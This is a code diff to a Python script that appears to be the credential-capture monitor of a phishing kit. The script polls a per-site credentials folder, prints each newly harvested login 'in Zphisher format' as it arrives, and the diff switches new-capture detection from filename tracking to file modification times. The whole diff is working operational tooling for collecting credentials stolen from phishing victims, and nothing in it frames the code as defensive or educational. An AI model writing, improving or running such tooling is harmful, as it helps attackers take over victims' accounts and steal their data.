@@ -1,7 +1,7 @@
 import os
 import time
 import json
-from utils import CREDENTIALS_DIR, extract_timestamp_from_filename
+from utils import CREDENTIALS_DIR
 
 # Ultra-simple color palette
 BOLD = '\033[1m'
@@ -46,49 +46,34 @@ def monitor_credentials(site_name):
     print(f"\n{BOLD}{CYAN}🔍 Monitoring for NEW credentials... (Ctrl+C to stop){RESET}")
     print(f"{YELLOW}Note: Every new capture will be printed instantly below{RESET}")
     
-    # Track files we've already printed
-    existing_files_at_startup = set()
-    if os.path.exists(site_dir):
-        for f in os.listdir(site_dir):
-            if f.endswith('.json') and not f.startswith('index') and not f.startswith('tracking'):
-                existing_files_at_startup.add(f)
-    
-    processed_files = set()
-    
+    # Use Modification Time (mtime) to detect brand new files instantly
+    last_mod_times = {}
+
     try:
         while True:
-            current_files = set()
+            current_files = []
             if os.path.exists(site_dir):
                 for f in os.listdir(site_dir):
                     if f.endswith('.json') and not f.startswith('index') and not f.startswith('tracking'):
-                        current_files.add(f)
+                        filepath = os.path.join(site_dir, f)
+                        mod_time = os.path.getmtime(filepath)
+                        current_files.append((f, mod_time))
             
-            # Detect new files since last check
-            new_files = current_files - existing_files_at_startup - processed_files
-            
-            if new_files:
-                # Sort them by timestamp in the filename
-                sorted_new_files = sorted(
-                    list(new_files), 
-                    key=lambda x: extract_timestamp_from_filename(x), 
-                    reverse=True
-                )
-                
-                for filename in sorted_new_files:
-                    cred_file = os.path.join(site_dir, filename)
+            for filename, mod_time in current_files:
+                # If it's a new file OR a file that was just modified
+                if filename not in last_mod_times or mod_time > last_mod_times[filename]:
                     try:
-                        with open(cred_file, 'r', encoding='utf-8') as f:
+                        filepath = os.path.join(site_dir, filename)
+                        with open(filepath, 'r', encoding='utf-8') as f:
                             entry = json.load(f)
                         
-                        # Print it in Zphisher format
                         display_zphisher_style(entry, filename)
                         
-                        # Mark as processed so we don't print it again
-                        processed_files.add(filename)
+                        # Mark this modification time as "already printed"
+                        last_mod_times[filename] = mod_time
                         
                     except Exception as e:
                         print(f"{RED}[!] Error reading {filename}: {e}{RESET}")
-                        processed_files.add(filename)
             
             time.sleep(1)
             
